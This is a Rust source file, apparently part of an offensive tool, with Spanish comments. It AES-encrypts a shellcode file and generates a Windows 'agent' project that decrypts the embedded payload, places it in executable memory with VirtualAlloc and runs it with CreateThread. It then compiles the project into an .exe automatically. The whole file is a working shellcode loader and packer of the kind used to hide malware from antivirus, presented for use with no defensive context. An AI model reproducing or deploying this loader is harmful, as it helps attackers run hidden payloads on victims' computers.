// File: src/encrypt.rs
// Función para encriptar shellcode en AES-256-CBC

extern crate aes;
extern crate cbc;
extern crate pbkdf2;
extern crate sha2;
extern crate hex;
extern crate hmac;
extern crate rand;
use aes::Aes256;
use cbc::{cipher::{block_padding::Pkcs7, BlockEncryptMut, BlockDecryptMut, KeyIvInit}, Encryptor, Decryptor};
use rand::RngCore;
use std::fs::File;
use std::io::{Read, Write};
use std::process::Command;

type Aes256CbcEnc = Encryptor<Aes256>;
type Aes256CbcDec = Decryptor<Aes256>;

const KEY_SIZE: usize = 32; // AES-256
const IV_SIZE: usize = 16;  // AES block size

pub fn encrypt_shellcode(shellcode: &[u8]) -> (Vec<u8>, Vec<u8>, Vec<u8>) {
    // Generate random key
    let mut key = vec![0u8; KEY_SIZE];
    rand::thread_rng().fill_bytes(&mut key);

    // Generate random IV
    let mut iv = vec![0u8; IV_SIZE];
    rand::thread_rng().fill_bytes(&mut iv);

    // Calculate padded size
    let block_size = 16;
    let padded_len = ((shellcode.len() + block_size) / block_size) * block_size;
    let mut buffer = vec![0u8; padded_len];
    buffer[..shellcode.len()].copy_from_slice(shellcode);
    
    // Encrypt the shellcode using AES-256-CBC
    let cipher = Aes256CbcEnc::new_from_slices(&key, &iv).unwrap();
    let encrypted_data = cipher.encrypt_padded_mut::<Pkcs7>(&mut buffer, shellcode.len()).unwrap();

    (encrypted_data.to_vec(), key, iv)
}

pub fn generate_agent(shellcode_file: &str, output_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Read the shellcode file
    let mut file = File::open(shellcode_file)?;
    let mut shellcode = Vec::new();
    file.read_to_end(&mut shellcode)?;

    println!("📊 Tamaño del shellcode: {} bytes", shellcode.len());

    // Encrypt the shellcode
    let (encrypted_data, key, iv) = encrypt_shellcode(&shellcode);

    println!("🔒 Shellcode encriptado: {} bytes", encrypted_data.len());




// Creación de Proyecto Cargo automáticamente
    // Create Cargo.toml for the agent
    let cargo_toml = format!(r#"[package]
name = "{}"
version = "0.1.0"
edition = "2021"

[dependencies]
aes = "0.8"
cbc = "0.1"
winapi = {{ version = "0.3", features = ["winnt", "memoryapi", "processthreadsapi", "synchapi", "winbase", "minwindef", "ntdef", "handleapi"] }}

[[bin]]
name = "{}"
path = "src/main.rs"
"#, output_name, output_name);

    // Create the agent code with embedded encrypted data
    let agent_code = format!(r#"use aes::Aes256;
use cbc::{{cipher::{{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit}}, Decryptor}};
use std::mem::transmute;
use std::ptr::copy;
use winapi::um::winnt::{{PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE}};
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::shared::minwindef::DWORD;

type Aes256CbcDec = cbc::Decryptor<Aes256>;

// Embedded encrypted data
const ENCRYPTED_SHELLCODE: &[u8] = &{:?};
const KEY: &[u8] = &{:?};
const IV: &[u8] = &{:?};

fn decrypt_shellcode() -> Vec<u8> {{
    let cipher = Aes256CbcDec::new_from_slices(KEY, IV).unwrap();
    let mut buffer = ENCRYPTED_SHELLCODE.to_vec();
    cipher.decrypt_padded_mut::<Pkcs7>(&mut buffer).unwrap().to_vec()
}}

fn main() {{
    unsafe {{
        let shellcode = decrypt_shellcode();
        
        let mem = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        
        if mem.is_null() {{
            return;
        }}
        
        copy(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
        
        let func: extern "system" fn() -> DWORD = transmute(mem);
        let thread = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(transmute(func as *const ())),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );
        
        if !thread.is_null() {{
            WaitForSingleObject(thread, INFINITE);
        }}
    }}
}}
"#, 
        encrypted_data, 
        key, 
        iv
    );

    // Create project directory
    let project_dir = format!("{}_project", output_name);
    std::fs::create_dir_all(format!("{}/src", project_dir))?;

    // Write Cargo.toml
    let mut cargo_file = File::create(format!("{}/Cargo.toml", project_dir))?;
    cargo_file.write_all(cargo_toml.as_bytes())?;

    // Write main.rs
    let mut main_file = File::create(format!("{}/src/main.rs", project_dir))?;
    main_file.write_all(agent_code.as_bytes())?;

    println!("✅ Proyecto generado: {}/", project_dir);
    println!("🔧 Compilando automáticamente...");

    // Compile automatically using cargo
    let output = Command::new("cargo")
        .args(&["build", "--release"])
        .current_dir(&project_dir)
        .output()?;

    if output.status.success() {
        println!("✅ Compilación exitosa!");
        println!("🏃 Ejecutable generado: {}/target/release/{}.exe", project_dir, output_name);
        
        // Copy the executable to current directory for easy access
        let exe_path = format!("{}/target/release/{}.exe", project_dir, output_name);
        let dest_path = format!("{}.exe", output_name);
        
        if let Err(e) = std::fs::copy(&exe_path, &dest_path) {
            println!("⚠️  No se pudo copiar el ejecutable: {}", e);
        } else {
            println!("📦 Ejecutable copiado a: {}", dest_path);
        }
    } else {
        println!("❌ Error durante la compilación:");
        println!("STDOUT: {}", String::from_utf8_lossy(&output.stdout));
        println!("STDERR: {}", String::from_utf8_lossy(&output.stderr));
        return Err("Compilación fallida".into());
    }
    
    Ok(())
}